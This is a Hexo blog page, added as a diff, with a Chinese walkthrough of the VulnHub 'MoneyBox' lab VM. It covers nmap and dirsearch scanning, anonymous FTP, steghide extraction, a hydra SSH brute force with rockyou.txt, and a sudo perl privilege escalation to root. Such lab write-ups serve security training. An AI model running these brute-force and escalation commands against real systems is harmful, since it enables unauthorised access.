@@ -1,0 +1,621 @@
+
+    <!DOCTYPE html>
+    <html lang="en"
+            
+          
+    >
+    <head>
+    <meta charset="utf-8">
+    
+
+    
+
+    
+    <title>
+        monney box靶机 |
+        
+        Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CUbuntu%20Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+    
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/v4-font-face.min.css">
+
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="下载Oracle VMNVirtual Box可以理解为VMware mini 下载menoy box虚拟机虚拟机地址： http:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;moneybox-1,653&#x2F;#download 导入虚拟机，设置一下Oracle VMNVirtual Box，网络和usb设备需要设置，如下图   kali设置1、编辑-虚拟网络编辑器 2、更改设置—–vment0桥">
+<meta property="og:type" content="article">
+<meta property="og:title" content="monney box靶机">
+<meta property="og:url" content="http://example.com/2024/01/08/box%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="下载Oracle VMNVirtual Box可以理解为VMware mini 下载menoy box虚拟机虚拟机地址： http:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;moneybox-1,653&#x2F;#download 导入虚拟机，设置一下Oracle VMNVirtual Box，网络和usb设备需要设置，如下图   kali设置1、编辑-虚拟网络编辑器 2、更改设置—–vment0桥">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677201141-a7ff6fac-ec2e-40fd-81ad-6b9ffbdcd5d6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677223773-9d6ac9a4-bbf5-4ca8-a4d1-e7e2d75d90fa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677421698-ba2c4296-a852-4f4d-9ccf-0c3586e32b6d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104171854.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104202405.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677858294-c17f779c-65c6-4908-9b88-713d7642ac19.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677877292-fbe13689-72e5-49d6-ad35-43dd8494d532.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678034777-0dcbe35f-ecc2-468a-b2e1-aa4c71c08be2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104190147.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104190418.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678209957-813af3df-cc68-4de0-b52b-5672cc72a460.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104190444.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678251500-e564fedc-22a7-4d9b-b5d1-44cf7f8a79bd.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104202802.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104202818.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191315.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678396748-1f4c4b35-36e5-48c7-94dd-df91d9c7174b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191522.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191649.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678489669-ac515324-8f3a-4574-bb46-151601832362.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191715.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678525753-95d2eb39-a8b6-4cc5-84bb-0f3daa92c66f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191923.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678571687-e81d0977-0ccb-4691-a5a1-51987c1558e4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191729.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678603724-6c0ba999-d49e-4b8c-b2a1-7cfa896d7817.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193201.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678696804-72af506f-6ed5-433b-be61-96e4032ba134.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193053.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193142.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193612.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104194049.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678724598-5fb071ec-9167-46ff-879f-b0b633f19967.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104194615.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104194638.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104195916.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104200449.png">
+<meta property="article:published_time" content="2024-01-08T01:53:24.000Z">
+<meta property="article:modified_time" content="2024-01-08T01:56:23.647Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677201141-a7ff6fac-ec2e-40fd-81ad-6b9ffbdcd5d6.png">
+    
+        <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+    
+    
+    
+    
+    
+<script src="https://unpkg.com/pace-js@1.2.4/pace.min.js"></script>
+
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/wowjs@1.1.3/css/libs/animate.css">
+
+        
+<script src="https://unpkg.com/wowjs@1.1.3/dist/wow.min.js"></script>
+
+        <script>
+          new WOW({
+            offset: 0,
+            mobile: true,
+            live: false
+          }).init();
+        </script>
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+    <body>
+    
+<div id='loader'>
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="loading-taichi">
+      <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+      <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+      <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+      <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+    </svg>
+    </div>
+    <div class="loading-word">少女祈祷中...</div>
+  </div>
+</div>
+</div>
+
+<script>
+  const endLoading = function() {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('load', endLoading);
+  document.getElementById('loader').addEventListener('click', endLoading);
+</script>
+
+
+    <div id="container">
+        <div id="wrap">
+            <header id="header">
+    
+        <img data-src="/images/banner.jpg" data-sizes="auto" alt="monney box靶机" class="lazyload">
+    
+    <div id="header-outer" class="outer">
+        <div id="header-title" class="inner">
+            <div id="logo-wrap">
+                
+                    
+                    
+                        <a href="/" id="logo"><h1>monney box靶机</h1></a>
+                    
+                
+            </div>
+            
+                
+                
+            
+        </div>
+        <div id="header-inner">
+            <nav id="main-nav">
+                <a id="main-nav-toggle" class="nav-icon"></a>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/">Home</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/archives">Archives</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/about">About</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/friend">Friend</a>
+                    </span>
+                
+            </nav>
+            <nav id="sub-nav">
+                
+                    <a id="nav-rss-link" class="nav-icon" href="/atom.xml"
+                       title="RSS Feed"></a>
+                
+                
+            </nav>
+            <div id="search-form-wrap">
+                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+            </div>
+        </div>
+    </div>
+</header>
+
+            <div id="content" class="outer">
+                <section id="main"><article id="post-box靶机" class="h-entry article article-type-post"
+         itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <div class="article-inner">
+        <div class="article-meta">
+            <div class="article-date wow slideInLeft">
+    <a href="/2024/01/08/box%E9%9D%B6%E6%9C%BA/" class="article-date-link">
+        <time datetime="2024-01-08T01:53:24.000Z"
+              itemprop="datePublished">2024-01-08</time>
+    </a>
+</div>
+
+            
+
+        </div>
+        <div class="hr-line"></div>
+        
+
+        <div class="e-content article-entry" itemprop="articleBody">
+            
+                <h1 id="下载Oracle-VMNVirtual-Box"><a href="#下载Oracle-VMNVirtual-Box" class="headerlink" title="下载Oracle VMNVirtual Box"></a>下载Oracle VMNVirtual Box</h1><p>可以理解为VMware mini</p>
+<h1 id="下载menoy-box虚拟机"><a href="#下载menoy-box虚拟机" class="headerlink" title="下载menoy box虚拟机"></a>下载menoy box虚拟机</h1><p>虚拟机地址：</p>
+<p><a target="_blank" rel="noopener" href="http://www.vulnhub.com/entry/moneybox-1,653/#download">http://www.vulnhub.com/entry/moneybox-1,653/#download</a></p>
+<p>导入虚拟机，设置一下Oracle VMNVirtual Box，网络和usb设备需要设置，如下图</p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677201141-a7ff6fac-ec2e-40fd-81ad-6b9ffbdcd5d6.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677223773-9d6ac9a4-bbf5-4ca8-a4d1-e7e2d75d90fa.png" alt="img"></p>
+<h1 id="kali设置"><a href="#kali设置" class="headerlink" title="kali设置"></a>kali设置</h1><p>1、编辑-虚拟网络编辑器</p>
+<p>2、更改设置—–vment0桥接模式 virtualbox<img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677421698-ba2c4296-a852-4f4d-9ccf-0c3586e32b6d.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104171854.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104171854.png" alt="img"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifdown eth0          //关闭网卡</span><br><span class="line">ifup eth0            //开启网卡</span><br></pre></td></tr></table></figure>
+
+<h1 id="靶机"><a href="#靶机" class="headerlink" title="靶机"></a>靶机</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0 本地网络上执行ARP扫描。它将显示与您的eth0网络接口关联的本地IP地址和MAC地址的列表</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104202405.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104202405.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677858294-c17f779c-65c6-4908-9b88-713d7642ac19.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.101</span><br><span class="line"></span><br><span class="line">nmap: 这是网络映射器（Network Mapper）的缩写，是一个用于网络发现和安全审计的开源工具。</span><br><span class="line">-p-: 这个选项指示Nmap扫描所有可能的端口，而不是只扫描一些常见的端口。在这里，连字符（-）表示范围，而没有具体的端口号，因此表示扫描所有1到65535的端口。</span><br><span class="line">192.168.56.101: 这是目标主机的IP地址，是要进行端口扫描的目标。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704677877292-fbe13689-72e5-49d6-ad35-43dd8494d532.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 21,22,80 -sC 192.168.56.101 -p 21,22,80: 这个选项指示Nmap只扫描指定的端口，这里是21（FTP）、22（SSH）、80（HTTP）。逗号分隔的端口列表表示仅扫描这些端口。 -sC: 这个选项启用了默认的脚本扫描。Nmap脚本引擎允许用户运行一系列脚本，以执行各种任务，如服务识别、漏洞探测等。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678034777-0dcbe35f-ecc2-468a-b2e1-aa4c71c08be2.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104190147.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104190147.png" alt="img"></a>发现ftp拥有允许匿名ftp登录的漏洞，Anonymous:Anonymous登录</p>
+<p>下载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101    --使用FTP（文件传输协议）连接到位于IP地址为192.168.56.101的主机 ls help</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104190418.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104190418.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678209957-813af3df-cc68-4de0-b52b-5672cc72a460.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104190444.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104190444.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678251500-e564fedc-22a7-4d9b-b5d1-44cf7f8a79bd.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings trytofind.jpg   strings trytofind.jpg 是一个命令行工具的使用，用于从文件中提取可打印字符序列，通常用于查看二进制文件中的文本信息。</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104202802.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104202802.png" alt="img"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info trytofind.jpg steghide 是一个用于隐藏数据在图像中的工具。steghide info 命令用于检索图像中隐藏的信息，但仅适用于使用 Steghide 工具进行隐藏的数据</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104202818.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104202818.png" alt="img"></a></p>
+<p>发现的确藏了文件，但是缺少一个密钥，去访问下80端口吧</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191315.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191315.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678396748-1f4c4b35-36e5-48c7-94dd-df91d9c7174b.png" alt="img"></p>
+<p>没有什么东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.56.101  -x 403,404,401 -u 192.168.56.101: 指定目标URL或IP地址，即要进行目录和文件枚举的目标web服务器的地址。 -x 403,404,401: 指定要排除的HTTP响应代码。</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191522.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191522.png" alt="img"></a></p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.56.101/blogs/">http://192.168.56.101/blogs/</a></p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191649.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191649.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678489669-ac515324-8f3a-4574-bb46-151601832362.png" alt="img"></p>
+<p>右键点击查看源代码</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191715.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191715.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678525753-95d2eb39-a8b6-4cc5-84bb-0f3daa92c66f.png" alt="img"></p>
+<p>有一个提示，把网址改成上述提示的</p>
+<p>访问S3cr3t-T3xt<br>192.168.56.101&#x2F;S3cr3t-T3xt&#x2F;</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191923.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191923.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678571687-e81d0977-0ccb-4691-a5a1-51987c1558e4.png" alt="img"></p>
+<p>我们可以看到出现了一个密钥，输入到之前缺少密钥的页面</p>
+<p>key:3xtr4ctd4t4</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191729.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104191729.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678603724-6c0ba999-d49e-4b8c-b2a1-7cfa896d7817.png" alt="img"></p>
+<p>先安装一个插件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install steghide</span><br><span class="line">steghide info trytofind.jpg</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193201.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193201.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678696804-72af506f-6ed5-433b-be61-96e4032ba134.png" alt="img"></p>
+<p>榨取图片中的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide  extract -sf trytofind.jpg steghide: 这是 steghide 工具的执行命令。 extract: 这是 steghide 工具的子命令，表示你想要从图像中提取隐藏的数据。 -sf trytofind.jpg: 这个选项指定要操作的源文件。</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193053.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193053.png" alt="img"></a></p>
+<p>查看剥离出的文件</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193142.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193142.png" alt="img"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你好，雷洛 我告诉你一件很重要的事。你的密码太弱了，所以改一下吧！不要低估它…… 说明renu密码可能是弱密码</span><br></pre></td></tr></table></figure>
+
+<p>Hydra 工具，它是一个用于暴力破解各种网络协议的密码的工具。这个具体的命令用于尝试通过 SSH 协议暴力破解给定主机上的用户名和密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l renu -P rockyou.txt   192.168.56.101 ssh     -- cp /usr/share/wordlists/rockyou.txt.gz .        --gunzip rockyou.txt.gz     //这是个超大的密码字典    --echo  root &gt; user.txt</span><br></pre></td></tr></table></figure>
+
+<p>我们已经知道renu的名字，直接可以指定用户名</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193612.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104193612.png" alt="img"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh renu@192.168.56.101    --使用 SSH（Secure Shell）协议来建立到目标主机的安全连接 ls cat user1.txt          //获得一个flag cat .bash_history      //查看历史命令</span><br></pre></td></tr></table></figure>
+
+<p>根据历史命令判断，当前renu账户可以通过ssh免密登录lily账户</p>
+<p>发现新的flag</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104194049.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104194049.png" alt="img"></a><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1704678724598-5fb071ec-9167-46ff-879f-b0b633f19967.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh lily@192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104194615.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104194615.png" alt="img"></a></p>
+<p>进入到lily的账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls cat user2.txt</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104194638.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104194638.png" alt="img"></a></p>
+<p>发现了第二个flag，下一个flag的话，可能在root用户里面，我们需要提升权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l sudo perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27; id</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 搜索perl</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104195916.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104195916.png" alt="img"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root                //切换到root的目录下 ls -al cat .root.txt</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104200449.png"><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/QQ%E6%88%AA%E5%9B%BE20240104200449.png" alt="img"></a></p>
+<p>完成实验，三个flag都找到了</p>
+
+            
+        </div>
+        <footer class="article-footer">
+            <a data-url="http://example.com/2024/01/08/box%E9%9D%B6%E6%9C%BA/" data-id="clr49uyz60000rgvldzxmd0jw" data-title="monney box靶机"
+               class="article-share-link">Share</a>
+            
+            
+            
+            
+
+        </footer>
+    </div>
+    
+        
+    <nav id="article-nav" class="wow fadeInUp">
+        
+        
+            <div class="article-nav-link-wrap article-nav-link-right">
+                
+                    
+                    
+                        <img data-src="/images/banner.jpg" data-sizes="auto" alt="逻辑漏洞之支付漏洞详解"
+                             class="lazyload">
+                    
+                
+                <a href="/2024/01/07/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"></a>
+                <div class="article-nav-caption">Older</div>
+                <h3 class="article-nav-title">
+                    
+                        逻辑漏洞之支付漏洞详解
+                    
+                </h3>
+            </div>
+        
+    </nav>
+
+
+    
+</article>
+
+
+
+
+
+
+
+
+
+
+
+</section>
+                
+                    <aside id="sidebar">
+    <div class="sidebar-wrap wow fadeInRight">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
+            <div class="sidebar-author-name">John Doe</div>
+            <div class="sidebar-description"></div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">23</div>
+            </div>
